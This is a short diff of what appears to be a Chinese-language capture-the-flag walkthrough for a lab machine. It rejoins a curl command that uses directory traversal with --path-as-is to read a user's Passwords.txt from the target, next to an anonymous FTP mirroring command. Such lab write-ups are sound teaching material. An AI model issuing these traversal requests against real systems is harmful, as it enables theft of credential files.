@@ -87,8 +87,7 @@ wget -m ftp://anonymous:anonymous@10.129.227.77
 
 ```bash
 # 如果不用 --path-as-is 的話，curl會先處理url而會自動地把 ../ 去掉，這樣就達不成我們要的結果了
-curl 'http://10.129.227.77/../../../../../../../../../../../../../../Users/Nathan/Deskto
-p/Passwords.txt' --path-as-is
+curl 'http://10.129.227.77/../../../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt' --path-as-is
 ```
 
 ![Untitled](/img/in-post/servmon/Untitled2.png)
